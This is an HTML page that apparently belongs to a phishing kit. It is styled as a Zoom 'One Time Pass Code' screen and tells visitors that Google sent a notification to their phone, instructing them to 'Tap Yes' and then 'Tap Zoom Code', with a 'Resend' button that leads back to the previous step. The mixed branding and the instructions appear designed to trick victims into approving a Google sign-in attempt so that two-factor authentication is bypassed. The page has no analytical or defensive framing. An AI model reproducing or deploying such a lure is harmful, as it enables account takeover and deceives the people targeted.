<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>One Time Pass Code</title>

  <link rel="icon" type="image/png" href="../../logo.png" />
  
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }

    html, body {
      width: 100%;
      min-height: 100vh;
      background-color: #ffffff;
      color: #202124;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .container {
      width: 100%;
      max-width: 360px;
      display: flex;
      flex-direction: column;
      align-items: center;
      text-align: center;
      padding: 20px 16px;
      background: #ffffff;
    }

    /* Top Logo */
    .logo {
      width: 55px;
      height: 55px;
      object-fit: contain;
      margin-bottom: 8px;
      border-radius: 50%;
    }

    /* Main Title */
    h1 {
      font-size: 20px;
      font-weight: 700;
      color: #1a1a1a;
      margin-bottom: 10px;
    }

    /* Phone Graphic Illustration */
    .phone-illustration {
      width: 160px; 
      height: auto;
      object-fit: contain;
      margin-bottom: 10px;
    }

    /* Sub Heading */
    h2 {
      font-size: 18px;
      font-weight: 700;
      color: #1a1a1a;
      margin-bottom: 6px;
    }

    /* Description Text */
    .desc-text {
      font-size: 14.5px;
      font-weight: 600;
      color: #1f2937;
      line-height: 1.5;
      margin-bottom: 20px;
    }

    .desc-text span {
      font-weight: 800;
      color: #000000;
    }

    /* Resend Button */
    .btn-join {
      background-color: #007aff;
      color: white;
      padding: 13px 0;
      width: 90%;
      max-width: 280px;
      font-size: 15px;
      font-weight: bold;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      box-shadow: 0 4px 12px rgba(0, 122, 255, 0.2);
      transition: background-color 0.2s, transform 0.1s;
    }

    .btn-join:hover {
      background-color: #005ec4;
    }

    .btn-join:active {
      transform: scale(0.98);
    }
  </style>
</head>
<body>

  <div class="container">
    <img class="logo" src="../../Zoom-Logo.png" alt="Logo">
    <h1>One Time Pass Code</h1>
    <img class="phone-illustration" src="../icon.gif" alt="Phone Illustration">
    <h2>Check your phone.</h2>
    <p class="desc-text">
      Google sent a notification to your phone.<br>
      <span>Tap Yes</span> on the notification<br>
      Then Tap Zoom Code
    </p>

    <button class="btn-join" onclick="window.location.href='../'">Resend</button>
  </div>

</body>
</html>
